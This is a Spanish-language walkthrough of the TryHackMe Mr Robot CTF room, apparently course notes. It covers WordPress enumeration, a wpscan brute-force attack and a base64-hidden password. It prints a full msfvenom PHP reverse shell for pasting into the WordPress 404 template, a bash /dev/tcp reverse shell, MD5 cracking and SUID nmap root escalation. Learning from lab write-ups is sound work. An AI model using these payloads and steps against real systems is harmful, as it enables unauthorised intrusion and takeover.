
-----
- TAG: #Práctica #Vulnerabilidades #WordPress #Escalada-De-Privilegios 
----

Vamos a realizar una máquina (CFT) aplicando distintas tecnicas de hacking dentro de un entorno **WordPress** que ya lo hemos visto en clases anteriores 

En esta ocasión vamos a estar practicando con una máquina de **TryHackMe** - [Mr robot CTF](https://tryhackme.com/r/room/mrrobot)

- Conectarse a la vpn desde su máquina Linux
- Empezar la máquina en la página para obtener la dirección ip 

----

Empezamos viendo si tenemos conectividad con la máquina :

```bash
ping -c 1 1.2.3.4
```

Ahora hacemos un escaneo de vulnerabilidades con **nmap** :

```bash
nmap -p- --open -sS -sC -sV --min-rate=5000 -n -vvv -Pn 1.2.3.4 -oN escaneo
```

Una vez terminado el escaneo nos damos cuenta que tenemos el puerto `80` y el puerto `443`

Si revisamos la página nos mostrará una simulación como la serie de **Mr Robots**, como no encontramos nada interesante procedemos hacer **Fuzzing Web** con **Gobuster**

```bash
gobuster dir -u http://1.2.3.4/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Con este escaneo nos daremos cuenta enseguida que estamos contra un entorno **wordpress** ya que muestra varios directorios y entre ellos se encuentran los comunes de `wp-login`, `wp-content` etc

Si nos dirigimos a la ruta que dice `wp-login`,  vemos que nos encontramos con un panel de login de wordpress 

Algo en tomar en cuenta que suele ser muy importante y sobre todo dentro del examen, cuando intenten con un usurio el sistema les indicare que el usuario es correcto pero la contraseña no.

Si ponemos el usuario **Elliot** y cualquier contraseña, veremos que nos indica que la contraseña para ese usuario es incorrecta.

Si nos encontramos con este caso dentro del examen, sabremos que el siguiente paso a realzar es un ataque de fuerza bruta para ese panel, pero no con **Hydra** (hydra sirve para protocolos ssh, ftp, smb)

Para estos casos es útil usar **vpscan** ya que es la mejor herramienta para entornos **WordPress** con el diccionario **Rockyou**

```bash
wpscan --url http://1.2.3.4 --passwords /usr/share/wordlists/rockyou.txt --username Elliot
```

Por lo general con este tipo de ataque suele aparecer la contraseña, ya que el examen esta hecho para realizar ataques de fuerza bruta.

Pero si no les aparece les recomiendo probar otras cosas, por ejemplo dentro del directorio `license` ocurre algo extraño.

Si abren el directorio les mostrará un texto y al final de todo encontraremos una cadena de texto, es importante saber si esta codificado en `base 64`, asi que lo deciframos para ver que contiene

```bash
echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
```

Respuesta:

```bash
elliot:ER28-0652
```

Aqui nos muestra el usuario y contraseña.

Dado que esta contraseña no se encuentra en el directorio, siempre es recomendable buscar información por los directorios y si encuentran una cadena de texto extraña traten de descodificarla en `base64`

Encontrada una vez la contraseña, volvemos a la página de Login e ingresamos las credenciales para podernos logear 

-----

Una vez que estemos dentro del panel de administración de **WordPress**, como podemos obtener acceso a la máquina victima, es decir a la máquina que este alojando este **WordPress** 

Recuerden que en `Appearance`, tenemos la opción de `Editor`, una vez dentro a nuestro lado derecho tendremos varias plantillas 

Por ejemplo si editamos alguna de estas plantillas e insertamos un código malicioso y luego accedo a ellas desde el navegador pues estaremos llamando al contenido malicioso que subimos.

En este punto entraría en juego la herramienta `msfvenom` para crear nuestro archivo malicioso, para luego copiar y pegarlos dentro del directorio de wordpress 

```bash
msfvenom -p php/reverse_php LHOST=1.2.3.4 LPORT=443 -f raw > pwned.php
```

Una vez creado el payload, le hacemos un `cat` y copiariamos un texto como este : 

```php
/*<?php /**/
  @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_se
  $dis=@ini_get('disable_functions');
  if(!empty($dis)){
    $dis=preg_replace('/[, ]+/',',',$dis);
    $dis=explode(',',$dis);
    $dis=array_map('trim',$dis);
  }else{
    $dis=array();
  }
  
$ipaddr='10.21.21.212';
$port=443;

if(!function_exists('CkWFVVEpPfTarR')){
  function CkWFVVEpPfTarR($c){
    global $dis;
    
  if (FALSE !== stristr(PHP_OS, 'win' )) {
    $c=$c." 2>&1\n";
  }
  $JxlwS='is_callable';
  $YsBb='in_array';
  
  if($JxlwS('system')&&!$YsBb('system',$dis)){
    ob_start();
    system($c);
    $o=ob_get_contents();
    ob_end_clean();
  }else
  if($JxlwS('proc_open')&&!$YsBb('proc_open',$dis)){
    $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),arr
    $o=NULL;
    while(!feof($pipes[1])){
      $o.=fread($pipes[1],1024);
    }
    @proc_close($handle);
  }else
  if($JxlwS('exec')&&!$YsBb('exec',$dis)){
    $o=array();
    exec($c,$o);
    $o=join(chr(10),$o).chr(10);
  }else
  if($JxlwS('passthru')&&!$YsBb('passthru',$dis)){
    ob_start();
    passthru($c);
    $o=ob_get_contents();
    ob_end_clean();
  }else
  if($JxlwS('shell_exec')&&!$YsBb('shell_exec',$dis)){
    $o=`$c`;
  }else
  if($JxlwS('popen')&&!$YsBb('popen',$dis)){
    $fp=popen($c,'r');
    $o=NULL;
    if(is_resource($fp)){
      while(!feof($fp)){
        $o.=fread($fp,1024);
      }
    }
    @pclose($fp);
  }else
  {
    $o=0;
  }

    return $o;
  }
}
$nofuncs='no exec functions';
if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
  $s=@fsockopen("tcp://10.21.21.212",$port);
  while($c=fread($s,2048)){
    $out = '';
    if(substr($c,0,3) == 'cd '){
      chdir(substr($c,3,-1));
    } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
      break;
    }else{
      $out=CkWFVVEpPfTarR(substr($c,0,-1));
      if($out===false){
        fwrite($s,$nofuncs);
        break;
      }
    }
    fwrite($s,$out);
  }
  fclose($s);
}else{
  $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
  @socket_connect($s,$ipaddr,$port);
  @socket_write($s,"socket_create");
  while($c=@socket_read($s,2048)){
    $out = '';
    if(substr($c,0,3) == 'cd '){
      chdir(substr($c,3,-1));
    } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
      break;
    }else{
      $out=CkWFVVEpPfTarR(substr($c,0,-1));
      if($out===false){
        @socket_write($s,$nofuncs);
        break;
      }
    }
    @socket_write($s,$out,strlen($out));
  }
  @socket_close($s);
}
```

Ahora vamos a utilizar la plantilla `404 Template` para que se ejecute cuando ingresemos una url que no existe

Borramos el contenido que contenga e insertamos el payload que hemos creado, luego lo guardamos y ya estara cargado nuestro archivo malicioso 


Nos ponemos a la escucha por el puerto 443

```bash
nc -nlvp 443
```

Ahora nos dirigimos a la url de `wp-content` donde se encuentran las plantillas e ingresamos un ruta que no exista, ejemplo:

```https
http://1.2.3.4/wp-content/asdfasdfsadf
```

Como siempre les comento siempre es importante tener a mano una revershell ya que no suele ser estable la conexión 

Asi que nos ponemos a la escucha por otro puerto y nos enviamos la sesión que tengamos 

```bash
nc -nvlp 444
```

y desde la sesión por el puerto 443 nos enviamos la sesión 

```bash
bash -c "sh -i >& /dev/tcp/1.2.3.4/444 0>&1"
```

Y una vez con una sesión más estable, no nos permitirá hacer el tratamiento de la `tty`
Pero para ello tenemos otra opcion para hacerlo 

```python
python -c "import pty;pty.spawn('/bin/bash')"
```

Esto nos permitira tener un promp en caso de que les de problemas el tratamiento de la `tty`

Ahora navegamos por los diccionarios y nos encontraremos con otro usuario :

```bash
cd /home
ls
robot
cd robot
ls
key-2-of-2.txt password.raw-md5
```

Si vemos que contiene el archivo `password.raw-md5` veremos que tiene una contraseña hasheada y un usuario `robot`

Cuando se encuentren en un caso así, lo más recomendable es usar **Jhon The Ripper**  o utilizar la página http://crackstation.net y pegamos el hash y nos mostrará la contraseña 

hash:
```hash
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Crackeado:
```md5
abcdefghijklmnopqrstuvwxyz
```

Ahora pivoteamos al usuario `robot` 

```bash
su robot
password: abcdefghijklmnopqrstuvwxyz
```

Ahora buscaremos binarios **SUID** para la escalada de privilegios 

```bash
find / -perm -4000 2>/dev/null
```

Encontramos binarios pero sobre todo hay uno que no deberia estar que es el de `nmap`

Nos podemos asegurar en la página de `GTFOBins` y como si nos aparece y deberíamos buscar por `SUID` ya que ejecutamos el comando -perm para encontrar binarios SUID

Pero en caso de que no entiendan o no les funcione el comando podemos buscar más información por internet tipo 

```search
nmap privilege escalation suid
```


Y si abrimos la primera página que nos muestre encontraremos la siguiente información 

![[SUID-nmap.png]]

Si ejecutamos el primer comando nos dara acceso como usuarios `root` y si hacemos un `!sh` tendremos un consola interactiva de shell

```bash
nmap --interactive
!sh
```

Y listo amigos con esto estaría resuelta la máquina de Mr Robot.